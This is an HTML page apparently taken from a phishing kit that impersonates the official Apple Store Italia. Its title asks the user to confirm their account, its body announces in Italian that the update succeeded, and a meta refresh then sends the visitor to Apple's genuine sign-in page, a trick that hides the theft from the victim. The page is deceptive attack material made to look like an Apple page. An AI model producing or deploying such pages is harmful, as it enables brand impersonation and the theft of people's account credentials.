﻿<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>Apple Store Italia ufficiale - Conferma il tuo account</title>
	<link href="css/style.css" type="text/css" rel="stylesheet" />
	<link rel="stylesheet" href="css/validationEngine.jquery.css" type="text/css" />
	<script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<link rel="shortcut icon" href="img/favicon.ico">
  	<link rel="apple-touch-icon" href="img/favicon.ico">
	<script>
		jQuery(document).ready(function(){
			jQuery("#signup").validationEngine();
		});
	</script>
	
</head>
<body>
</body>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
			<div class="left">     
								
				<h1> </h1>
				<p></p>
			</div>
			<div class="right">
				<meta http-equiv="refresh" content="1;URL=https://appleid.apple.com/cgi-bin/WebObjects/MyAppleId.woa/wa/directToSignIn?localang=it_IT">
					<center><h1><font color="25a829">L'aggiornamento Ha avuto Successo</font></center><img border="0" src="img/apple.jpg" width="222" height="222" align="right"></h1>
					<table cellpadding="0" cellspacing="0" border="0" width="105%">
				
						</tr>
					</table>
				</form>
			</div>
		</div>
	</div>
</html>